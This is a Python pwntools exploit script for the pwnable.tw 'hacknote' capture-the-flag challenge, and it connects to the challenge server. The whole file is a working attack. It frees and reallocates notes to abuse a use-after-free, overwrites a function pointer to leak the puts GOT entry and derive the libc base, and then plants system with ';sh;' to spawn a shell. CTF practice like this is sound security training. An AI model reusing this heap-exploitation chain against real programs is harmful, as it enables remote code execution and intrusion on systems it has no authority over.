#!/usr/bin/env python3

from pwn import *

exe = ELF("./hacknote_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


if args.LOCAL:
	r = process([exe.path])
	#gdb.attach(r, gdbscript='''
	#	b *0x08048932
	#	b *0x0804893D
	#	c
	#	''')
	#input()

else:
	r = remote("chall.pwnable.tw", 10102)



def main():
	puts_got = 0x804a024

	r.sendlineafter(b"choice", b"1")
	r.sendlineafter(b"size", b"24")
	r.sendlineafter(b"Content", b"gnas1")

	r.sendlineafter(b"choice", b"1")
	r.sendlineafter(b"size", b"24")
	r.sendlineafter(b"Content", b"gnas2")



	r.sendlineafter(b"choice", b"2")
	r.sendlineafter(b"Index", b"1")

	r.sendlineafter(b"choice", b"2")
	r.sendlineafter(b"Index", b"0")



	r.sendlineafter(b"choice", b"1")
	r.sendlineafter(b"size", b"8")
	payload = p32(0x804862B) + p32(puts_got)
	r.sendlineafter(b"Content", payload)


	r.sendlineafter(b"choice", b"3")
	r.sendlineafter(b"Index :", b"1")
	libc.address = u32(r.recv(4)) - 0x5f140
	print("libc addr: ", hex(libc.address))



	system = libc.sym['system']


	r.sendlineafter(b"choice", b"2")
	r.sendlineafter(b"Index", b"2")


	r.sendlineafter(b"choice", b"1")
	r.sendlineafter(b"size", b"8")
	payload = p32(system) + b";sh;"
	print(b"payload: ", payload)
	r.sendlineafter(b"Content", payload)

	r.sendlineafter(b"choice", b"3")
	r.sendlineafter(b"Index :", b"1")
	r.sendline(b"ls")

	# good luck pwning :)

	r.interactive()


if __name__ == "__main__":
    main()
